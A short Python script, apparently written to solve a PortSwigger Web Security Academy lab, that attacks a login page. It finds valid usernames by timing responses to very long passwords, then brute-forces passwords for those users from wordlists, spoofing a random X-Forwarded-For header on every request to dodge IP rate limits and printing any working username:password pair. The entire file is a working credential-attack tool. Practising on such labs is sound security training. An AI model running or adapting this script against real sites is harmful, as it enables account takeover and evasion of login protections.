import requests
import time
import random

def randIp():
    return f"{random.randrange(0, 255)}.{random.randrange(0, 255)}.{random.randrange(0, 255)}.{random.randrange(0, 255)}"


url = "https://0a66006104c0c0b684c245a000c400b1.web-security-academy.net/login"

users = [line.strip() for line in open("../users.txt", "r")]
passwords = [line.strip() for line in open("../pass.txt", "r")]

valid_users = []
for user in users:
    payload = {"username" : user, "password" : "A"*1000}
    start = time.time()
    owo = requests.post(url, data=payload, headers = {"X-Forwarded-For": randIp()})
    end = time.time()
    t=end-start
    if(t > 1.5):
        valid_users.append(user)
        print(user)

for user in valid_users:
    for pwd in passwords:
        payload = {"username" : user, "password" : pwd}
        uwu= requests.post(url, data=payload, headers = {"X-Forwarded-For": randIp()}, allow_redirects=False)
        if uwu.status_code in (300, 301, 302, 303, 307, 308):
            print(user + ":" + pwd)
            break

        
